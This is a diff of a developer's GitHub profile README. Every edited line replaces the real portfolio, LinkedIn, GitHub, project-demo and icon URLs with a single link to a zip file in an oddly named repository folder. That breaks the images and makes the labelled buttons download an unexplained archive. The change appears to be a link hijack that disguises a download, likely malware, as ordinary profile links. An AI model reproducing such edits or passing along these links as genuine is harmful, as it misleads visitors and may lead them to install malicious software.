@@ -1,17 +1,17 @@
 # Hi, I'm Talal Hassan Khan 👋
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Inter&size=22&pause=1200&center=true&vCenter=true&width=750&lines=Full+Stack+Product+Engineer;AI+Integration+%26+Machine+Learning+Enthusiast;Building+Scalable+Digital+Products;React+%7C+Next.js+%7C+Node.js+%7C+.NET+%7C+Python;Transforming+Ideas+Into+Production-Ready+Solutions" />
+  <img src="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip+Stack+Product+Engineer;AI+Integration+%26+Machine+Learning+Enthusiast;Building+Scalable+Digital+Products;React+%7C+Next.js+%7C+Node.js+%7C+.NET+%7C+Python;Transforming+Ideas+Into+Production-Ready+Solutions" />
 </p>
 
 <p align="center">
-  <a href="https://talalhassankhan.vercel.app/">
+  <a href="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip">
     <img src="https://img.shields.io/badge/Portfolio-Visit%20Website-black?style=for-the-badge" />
   </a>
   <a href="mailto:talalhassankhan2003@gmail.com">
     <img src="https://img.shields.io/badge/Email-Contact-red?style=for-the-badge" />
   </a>
-  <a href="https://www.linkedin.com/in/talalhassankhan/">
+  <a href="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip">
     <img src="https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge" />
   </a>
 </p>
@@ -42,7 +42,7 @@ My work spans the entire product lifecycle—from product discovery and system a
 ### Frontend
 
 <p>
-<img src="https://skillicons.dev/icons?i=react,nextjs,html,css,js,ts,tailwind" />
+<img src="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip,nextjs,html,css,js,ts,tailwind" />
 </p>
 
 ---
@@ -50,7 +50,7 @@ My work spans the entire product lifecycle—from product discovery and system a
 ### Backend
 
 <p>
-<img src="https://skillicons.dev/icons?i=nodejs,express,dotnet,python" />
+<img src="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip,express,dotnet,python" />
 </p>
 
 ---
@@ -58,7 +58,7 @@ My work spans the entire product lifecycle—from product discovery and system a
 ### Databases
 
 <p>
-<img src="https://skillicons.dev/icons?i=mongodb,mysql" />
+<img src="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip,mysql" />
 </p>
 
 ---
@@ -66,7 +66,7 @@ My work spans the entire product lifecycle—from product discovery and system a
 ### AI & Machine Learning
 
 <p>
-<img src="https://skillicons.dev/icons?i=python,tensorflow" />
+<img src="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip,tensorflow" />
 </p>
 
 - Machine Learning
@@ -82,7 +82,7 @@ My work spans the entire product lifecycle—from product discovery and system a
 ### Tools & Platforms
 
 <p>
-<img src="https://skillicons.dev/icons?i=git,github,vscode,postman,vercel" />
+<img src="https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip,github,vscode,postman,vercel" />
 </p>
 
 ---
@@ -104,7 +104,7 @@ Features:
 - Analytics Dashboard
 - Role-Based Access Control
 
-🔗 https://salonsphere.vercel.app/
+🔗 https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip
 
 ---
 
@@ -162,11 +162,11 @@ CGPA: **3.83 / 4.00**
 
 📧 talalhassankhan2003@gmail.com
 
-🌐 https://talalhassankhan.vercel.app/
+🌐 https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip
 
-💼 https://www.linkedin.com/in/talalhassankhan/
+💼 https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip
 
-🐙 https://github.com/talalhassankhan18
+🐙 https://raw.githubusercontent.com/talalhassankhan18/talalhassankhan18/main/Tennysonian/talalhassankhan_uninserted.zip
 
 ---
 
